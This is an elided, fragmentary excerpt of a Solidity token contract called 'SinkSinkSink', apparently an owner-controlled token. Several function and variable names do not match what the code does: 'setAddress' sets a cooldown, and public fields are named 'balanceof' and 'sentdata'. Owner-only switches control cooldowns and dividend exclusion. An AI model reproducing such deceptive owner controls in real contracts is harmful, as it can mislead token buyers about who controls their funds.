...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function restAnalysis(address newOwner) external onlyOwner returns (bool) {
...
contract SinkSinkSink is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "SinkSinkSink";    
    string public symbol = "SSS";
    uint8 public decimals = 9;   

    uint8 public entrance;
    uint8 public balanceof;  
    uint8 public sentdata;  
    ...
    function setAddress(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
    ...
    function tokenRemove(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;
    }

    function setwithdrawtoken(uint256 newCoolWait) external onlyOwner {
        require(
